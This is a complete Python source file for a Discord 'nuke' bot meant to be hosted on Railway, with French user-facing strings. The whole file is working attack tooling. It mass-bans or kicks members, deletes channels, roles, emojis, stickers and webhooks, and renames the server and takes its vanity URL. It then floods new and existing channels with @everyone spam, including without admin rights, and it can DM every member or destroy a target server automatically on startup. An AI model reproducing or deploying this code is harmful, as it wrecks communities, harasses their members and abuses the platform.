# language: Python 3.11+, file: bot.py, target: Discord + Railway
# Nuke + external /spam (no admin needed)

from __future__ import annotations

import os
import sys
import asyncio
import logging
import traceback
from typing import Optional, List, Iterable

import aiohttp
from aiohttp import web
import discord
from discord import app_commands
from discord.ext import commands
from discord.errors import HTTPException, Forbidden, NotFound

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("nuke")

def clean(v: Optional[str]) -> str:
    if not v:
        return ""
    v = v.strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in ("'\""):
        v = v[1:-1].strip()
    return v

def first_env(*keys: str, default: str = "") -> str:
    for k in keys:
        val = clean(os.getenv(k))
        if val:
            log.info("Using env %s (len=%s)", k, len(val))
            return val
    return default

def env_bool(key: str, default: bool = False) -> bool:
    v = (os.getenv(key) or str(default)).strip().lower()
    return v in ("1", "true", "yes", "on", "y")

def env_int(key: str, default: int = 0) -> int:
    try:
        return int((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default

def env_float(key: str, default: float = 0.0) -> float:
    try:
        return float((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default

def parse_ids(raw: str) -> set[int]:
    out: set[int] = set()
    for part in raw.replace(" ", "").split(","):
        if part.isdigit():
            out.add(int(part))
    return out

TOKEN = first_env("TOKEN", "DISCORD_TOKEN", "BOT_TOKEN", "DISCORD_BOT_TOKEN", "CLIENT_TOKEN", "NUKE_TOKEN", "DISCORD_BOT")
OWNER_RAW = first_env("OWNER_IDS", "OWNER_ID", "OWNERS", "BOT_OWNER", "OWNER", "ADMIN_IDS", "ADMIN_ID")
OWNER_IDS = parse_ids(OWNER_RAW)
PREFIX = first_env("PREFIX", "BOT_PREFIX", default="!") or "!"
PORT = env_int("PORT", 8080)

NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 50))
SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 15))
SPAM_TEXT = first_env("SPAM_TEXT", default="@everyone NUKED") or "@everyone NUKED"
WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
DELETE_ROLES = env_bool("DELETE_ROLES", True)
DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
DELETE_WEBHOOKS = env_bool("DELETE_WEBHOOKS", True)
BAN_ALL = env_bool("BAN_ALL", True)
KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
SKIP_BOTS = env_bool("SKIP_BOTS", False)
SKIP_OWNER = env_bool("SKIP_OWNER", True)
CHANGE_ICON = env_bool("CHANGE_ICON", False)
ICON_URL = first_env("ICON_URL")
CHANGE_BANNER = env_bool("CHANGE_BANNER", False)
BANNER_URL = first_env("BANNER_URL")
CREATE_ROLES = max(0, env_int("CREATE_ROLES", 10))
ROLE_NAME = first_env("ROLE_NAME", default="nuked") or "nuked"
CHANNEL_NAME = first_env("CHANNEL_NAME", default="nuked") or "nuked"
CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 5))
CREATE_VOICE = max(0, env_int("CREATE_VOICE", 10))
DM_MESSAGE = first_env("DM_MESSAGE")
LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
CONCURRENCY = max(1, min(env_int("CONCURRENCY", 5), 15))
RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.15))
PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
VANITY = first_env("VANITY")
KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))
# external spam defaults
EXTERNAL_SPAM_COUNT = max(1, env_int("EXTERNAL_SPAM_COUNT", 25))
EXTERNAL_SPAM_ALL = env_bool("EXTERNAL_SPAM_ALL", True)  # all writable channels

log.info("=== NUKE BOT BOOT ===")
log.info("python=%s", sys.version.split()[0])
keys = sorted(os.environ.keys())
log.info("ENV KEYS (%s): %s", len(keys), ", ".join(keys))
log.info("PORT=%s PREFIX=%s", PORT, PREFIX)
log.info("TOKEN found=%s len=%s", bool(TOKEN), len(TOKEN))
log.info("OWNER_IDS=%s", OWNER_IDS or "(empty)")

intents = discord.Intents.none()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis = True
intents.emojis_and_stickers = True

bot = commands.Bot(
    command_prefix=PREFIX,
    intents=intents,
    help_command=None,
    chunk_guilds_at_startup=False,
)

sem: asyncio.Semaphore | None = None
_http: aiohttp.ClientSession | None = None
_bot_ready = False

def is_owner_id(uid: int) -> bool:
    if not OWNER_IDS:
        return False
    return uid in OWNER_IDS

def owner_only():
    async def pred(ctx: commands.Context) -> bool:
        if not OWNER_IDS:
            await ctx.send("OWNER_IDS manquant.")
            return False
        return ctx.author.id in OWNER_IDS
    return commands.check(pred)

async def get_http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession()
    return _http

async def external_log(msg: str):
    if not LOG_WEBHOOK:
        return
    try:
        session = await get_http()
        await session.post(LOG_WEBHOOK, json={"content": f"```{msg[:1900]}```"})
    except Exception:
        pass

async def say(msg: str):
    log.info(msg)
    await external_log(msg)

async def limited(coro):
    assert sem is not None
    async with sem:
        try:
            return await coro
        except HTTPException as e:
            if e.status == 429:
                retry = 1.5
                try:
                    if e.response is not None:
                        retry = float(e.response.headers.get("Retry-After", 1.5))
                except Exception:
                    pass
                await asyncio.sleep(retry)
                try:
                    return await coro
                except Exception:
                    return None
            return None
        except (Forbidden, NotFound):
            return None
        except Exception:
            return None
        finally:
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)

async def gather_limited(coros: Iterable):
    tasks = [asyncio.create_task(limited(c)) for c in coros]
    if not tasks:
        return []
    return await asyncio.gather(*tasks, return_exceptions=True)

def writable_text_channels(guild: discord.Guild) -> List[discord.TextChannel]:
    """Channels where the bot can send messages — no admin required."""
    me = guild.me
    out: List[discord.TextChannel] = []
    for ch in guild.text_channels:
        if not isinstance(ch, discord.TextChannel):
            continue
        if me is None:
            out.append(ch)
            continue
        perms = ch.permissions_for(me)
        if perms.send_messages:
            out.append(ch)
    return out

async def external_spam(guild: discord.Guild, message: str, count: int, all_channels: bool) -> int:
    """Spam message in writable channels only. Works without Administrator."""
    channels = writable_text_channels(guild)
    if not all_channels and channels:
        # prefer current context channel handled by caller; here spam all writable
        pass
    if not channels:
        return 0

    sent = 0
    mention = discord.AllowedMentions(everyone=True, users=True, roles=True)

    async def flood(ch: discord.TextChannel):
        nonlocal sent
        local = 0
        for _ in range(count):
            try:
                await ch.send(message, allowed_mentions=mention)
                local += 1
            except Exception:
                break
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)
        return local

    results = await gather_limited(flood(ch) for ch in channels)
    for r in results:
        if isinstance(r, int):
            sent += r
    return sent

async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception as e:
        log.warning("chunk: %s", e)
    return list(guild.members)

async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
    me, owner = guild.me, guild.owner
    members = await fetch_members(guild)
    targets = [m for m in members if not (me and m.id == me.id) and not (SKIP_OWNER and owner and m.id == owner.id) and not (SKIP_BOTS and m.bot)]

    async def one(m: discord.Member):
        if DM_MESSAGE:
            try:
                await m.send(DM_MESSAGE)
            except Exception:
                pass
        if kick:
            await m.kick(reason=BAN_REASON)
        else:
            await m.ban(reason=BAN_REASON, delete_message_days=0)
        return 1

    results = await gather_limited(one(m) for m in targets)
    return sum(1 for r in results if r == 1)

async def action_delete_channels(guild: discord.Guild) -> int:
    async def one(ch):
        await ch.delete()
        return 1
    results = await gather_limited(one(ch) for ch in list(guild.channels))
    return sum(1 for r in results if r == 1)

async def action_delete_roles(guild: discord.Guild) -> int:
    me = guild.me
    roles = [r for r in guild.roles if not r.is_default() and not r.managed and not (me and r >= me.top_role)]
    async def one(role):
        await role.delete()
        return 1
    results = await gather_limited(one(r) for r in roles)
    return sum(1 for r in results if r == 1)

async def action_delete_emojis(guild: discord.Guild) -> int:
    async def one(e):
        await e.delete()
        return 1
    results = await gather_limited(one(e) for e in list(guild.emojis))
    return sum(1 for r in results if r == 1)

async def action_delete_stickers(guild: discord.Guild) -> int:
    async def one(s):
        await s.delete()
        return 1
    results = await gather_limited(one(s) for s in list(guild.stickers))
    return sum(1 for r in results if r == 1)

async def action_delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
    except Exception:
        return 0
    async def one(wh):
        await wh.delete()
        return 1
    results = await gather_limited(one(w) for w in webhooks)
    return sum(1 for r in results if r == 1)

async def download_bytes(url: str) -> Optional[bytes]:
    if not url:
        return None
    try:
        session = await get_http()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                return await resp.read()
    except Exception:
        pass
    return None

async def action_rename(guild: discord.Guild, name: str) -> bool:
    kwargs = {"name": name[:100]}
    if CHANGE_ICON and ICON_URL:
        data = await download_bytes(ICON_URL)
        if data:
            kwargs["icon"] = data
    if CHANGE_BANNER and BANNER_URL:
        data = await download_bytes(BANNER_URL)
        if data:
            kwargs["banner"] = data
    try:
        await guild.edit(**kwargs)
        return True
    except Exception as e:
        log.warning("rename: %s", e)
        return False

async def action_create_channels(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
    created: List[discord.TextChannel] = []
    async def one(i: int):
        return await guild.create_text_channel(f"{base}-{i}")
    results = await gather_limited(one(i) for i in range(n))
    for r in results:
        if isinstance(r, discord.TextChannel):
            created.append(r)
    return created

async def action_create_categories(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_category(f"{base}-cat-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)

async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_voice_channel(f"{base}-vc-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)

async def action_create_roles(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_role(name=f"{base}-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)

async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        for _ in range(times):
            try:
                await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
            except Exception:
                break
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)
        return 1
    await gather_limited(one(ch) for ch in channels)

async def action_webhook_spam(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        wh = None
        try:
            wh = await ch.create_webhook(name="nuke")
            for _ in range(times):
                try:
                    await wh.send(text, username="NUKE", allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
                if RATE_LIMIT_DELAY:
                    await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            for _ in range(times):
                try:
                    await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
        finally:
            if wh:
                try:
                    await wh.delete()
                except Exception:
                    pass
        return 1
    await gather_limited(one(ch) for ch in channels)

async def action_dm_all(guild: discord.Guild, message: str) -> int:
    members = await fetch_members(guild)
    async def one(m: discord.Member):
        if m.bot or (guild.me and m.id == guild.me.id):
            return 0
        await m.send(message)
        return 1
    results = await gather_limited(one(m) for m in members)
    return sum(1 for r in results if r == 1)

async def action_prune(guild: discord.Guild, days: int) -> int:
    if days <= 0:
        return 0
    try:
        return await guild.prune_members(days=days, reason=BAN_REASON)
    except Exception:
        return 0

async def action_vanity(guild: discord.Guild, code: str) -> bool:
    if not code:
        return False
    try:
        await guild.edit(vanity_code=code)
        return True
    except Exception as e:
        log.warning("vanity: %s", e)
        return False

async def full_nuke(guild: discord.Guild):
    await say(f"[*] NUKE START → {guild.name} ({guild.id})")
    if BAN_ALL:
        await say(f"[+] Ban/Kick: {await action_ban_all(guild, kick=KICK_INSTEAD)}")
    if PRUNE_DAYS > 0:
        await say(f"[+] Prune: {await action_prune(guild, PRUNE_DAYS)}")
    if DELETE_WEBHOOKS:
        await say(f"[+] Webhooks: {await action_delete_webhooks(guild)}")
    await say(f"[+] Channels deleted: {await action_delete_channels(guild)}")
    if DELETE_ROLES:
        await say(f"[+] Roles deleted: {await action_delete_roles(guild)}")
    if DELETE_EMOJIS:
        await say(f"[+] Emojis: {await action_delete_emojis(guild)}")
    if DELETE_STICKERS:
        await say(f"[+] Stickers: {await action_delete_stickers(guild)}")
    await say(f"[+] Rename: {await action_rename(guild, NUKE_NAME)}")
    if VANITY:
        await say(f"[+] Vanity: {await action_vanity(guild, VANITY)}")
    if CREATE_ROLES:
        await say(f"[+] Roles created: {await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
    if CREATE_CATEGORIES:
        await say(f"[+] Categories: {await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
    if CREATE_VOICE:
        await say(f"[+] Voice: {await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
    channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
    await say(f"[+] Text channels: {len(channels)}")
    if channels and SPAM_MESSAGES > 0:
        if WEBHOOK_SPAM:
            await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
        else:
            await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
        await say("[+] Spam done")
    await say("[*] NUKE COMPLETE")

async def health_handler(_request):
    return web.Response(text="online" if _bot_ready else "starting", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("Health OK on 0.0.0.0:%s", PORT)

# ───────────────────── SLASH (external app style) ─────────────────────

@bot.tree.command(name="spam", description="Flood un message dans tous les salons où le bot peut écrire (pas besoin d'admin)")
@app_commands.describe(
    message="Texte à spammer",
    count="Nombre de messages par salon (défaut 25)",
    only_here="True = seulement ce salon",
)
async def slash_spam(
    interaction: discord.Interaction,
    message: str,
    count: Optional[int] = None,
    only_here: Optional[bool] = False,
):
    if not is_owner_id(interaction.user.id):
        await interaction.response.send_message("Owner only.", ephemeral=True)
        return
    if not interaction.guild:
        await interaction.response.send_message("Serveur uniquement.", ephemeral=True)
        return

    n = count if count and count > 0 else EXTERNAL_SPAM_COUNT
    n = min(n, 100)
    await interaction.response.defer(ephemeral=True)

    if only_here:
        ch = interaction.channel
        if not isinstance(ch, discord.TextChannel):
            await interaction.followup.send("Pas un salon texte.", ephemeral=True)
            return
        sent = 0
        mention = discord.AllowedMentions(everyone=True, users=True, roles=True)
        for _ in range(n):
            try:
                await ch.send(message, allowed_mentions=mention)
                sent += 1
            except Exception:
                break
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)
        await interaction.followup.send(f"Spam ici: {sent} msgs", ephemeral=True)
        return

    sent = await external_spam(interaction.guild, message, n, all_channels=True)
    chans = len(writable_text_channels(interaction.guild))
    await interaction.followup.send(
        f"External spam: **{sent}** msgs sur **{chans}** salons (Send Messages only).",
        ephemeral=True,
    )

@bot.tree.command(name="spamhere", description="Spam uniquement ce salon (no admin)")
@app_commands.describe(message="Texte", count="Nombre (défaut 25)")
async def slash_spamhere(
    interaction: discord.Interaction,
    message: str,
    count: Optional[int] = None,
):
    if not is_owner_id(interaction.user.id):
        await interaction.response.send_message("Owner only.", ephemeral=True)
        return
    ch = interaction.channel
    if not isinstance(ch, discord.TextChannel):
        await interaction.response.send_message("Salon texte requis.", ephemeral=True)
        return
    n = min(count if count and count > 0 else EXTERNAL_SPAM_COUNT, 100)
    await interaction.response.defer(ephemeral=True)
    sent = 0
    mention = discord.AllowedMentions(everyone=True, users=True, roles=True)
    for _ in range(n):
        try:
            await ch.send(message, allowed_mentions=mention)
            sent += 1
        except Exception:
            break
        if RATE_LIMIT_DELAY:
            await asyncio.sleep(RATE_LIMIT_DELAY)
    await interaction.followup.send(f"Spamhere: {sent}", ephemeral=True)

@bot.tree.command(name="nuke", description="Nuke complet (nécessite permissions élevées)")
async def slash_nuke(interaction: discord.Interaction):
    if not is_owner_id(interaction.user.id):
        await interaction.response.send_message("Owner only.", ephemeral=True)
        return
    if not interaction.guild:
        await interaction.response.send_message("Serveur only.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    await full_nuke(interaction.guild)
    await interaction.followup.send("Nuke terminé (ou partiel selon perms).", ephemeral=True)

@bot.event
async def on_ready():
    global sem, _bot_ready
    sem = asyncio.Semaphore(CONCURRENCY)
    _bot_ready = True
    log.info("===== BOT ONLINE as %s =====", bot.user)
    log.info("guilds=%s owners=%s", len(bot.guilds), OWNER_IDS)
    try:
        synced = await bot.tree.sync()
        log.info("Slash commands synced: %s", len(synced))
    except Exception as e:
        log.warning("slash sync failed: %s", e)
    bot.loop.create_task(keepalive())
    if AUTO_NUKE_GUILD.isdigit():
        g = bot.get_guild(int(AUTO_NUKE_GUILD))
        if g:
            log.info("AUTO_NUKE → %s", g.name)
            await full_nuke(g)

async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SEC)
        log.info("alive | ready=%s guilds=%s latency=%.0fms", _bot_ready, len(bot.guilds), bot.latency * 1000)

@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        return
    log.error("cmd: %s", error)

@bot.event
async def on_error(event_method, *args, **kwargs):
    log.error("event %s\n%s", event_method, traceback.format_exc())

# prefix commands kept for full nuke when admin
@bot.command(name="nuke")
@owner_only()
async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        await ctx.send("Guild introuvable.")
        return
    await ctx.send(f"Nuke → **{target.name}**")
    await full_nuke(target)

@bot.command(name="spam")
@owner_only()
async def cmd_spam(ctx: commands.Context, *, message: str = SPAM_TEXT):
    """Prefix: spam external all writable channels"""
    n = EXTERNAL_SPAM_COUNT
    if not ctx.guild:
        return
    await ctx.message.delete() if ctx.message else None
    sent = await external_spam(ctx.guild, message, n, True)
    try:
        await ctx.send(f"External spam: {sent}", delete_after=5)
    except Exception:
        pass

@bot.command(name="banall")
@owner_only()
async def cmd_banall(ctx: commands.Context):
    await ctx.send(f"Banned: {await action_ban_all(ctx.guild, False)}")

@bot.command(name="kickall")
@owner_only()
async def cmd_kickall(ctx: commands.Context):
    await ctx.send(f"Kicked: {await action_ban_all(ctx.guild, True)}")

@bot.command(name="delchannels")
@owner_only()
async def cmd_delchannels(ctx: commands.Context):
    await ctx.send(f"Channels: {await action_delete_channels(ctx.guild)}")

@bot.command(name="delroles")
@owner_only()
async def cmd_delroles(ctx: commands.Context):
    await ctx.send(f"Roles: {await action_delete_roles(ctx.guild)}")

@bot.command(name="status")
@owner_only()
async def cmd_status(ctx: commands.Context):
    await ctx.send(f"{bot.user} | guilds={len(bot.guilds)} | {round(bot.latency*1000)}ms")

@bot.command(name="guilds")
@owner_only()
async def cmd_guilds(ctx: commands.Context):
    lines = [f"{g.name} | {g.id}" for g in bot.guilds]
    await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")

@bot.command(name="helpnuke")
@owner_only()
async def cmd_help(ctx: commands.Context):
    await ctx.send(
        "**External (no admin):** `/spam message:` `/spamhere`\n"
        "**Full (admin):** `/nuke` `!nuke` `!banall` `!delchannels`…"
    )

async def runner():
    await start_health_server()
    if not TOKEN:
        log.error("NO TOKEN — set TOKEN or DISCORD_TOKEN on Railway")
        while True:
            await asyncio.sleep(3600)
        return
    log.info("Connecting to Discord…")
    try:
        async with bot:
            await bot.start(TOKEN, reconnect=True)
    except discord.LoginFailure:
        log.error("LOGIN FAILED — reset token on Developer Portal")
        while True:
            await asyncio.sleep(3600)
    except Exception:
        log.error("BOT CRASH:\n%s", traceback.format_exc())
        while True:
            await asyncio.sleep(3600)

def main():
    try:
        asyncio.run(runner())
    except Exception:
        log.error("MAIN:\n%s", traceback.format_exc())
        sys.exit(1)

if __name__ == "__main__":
    main()
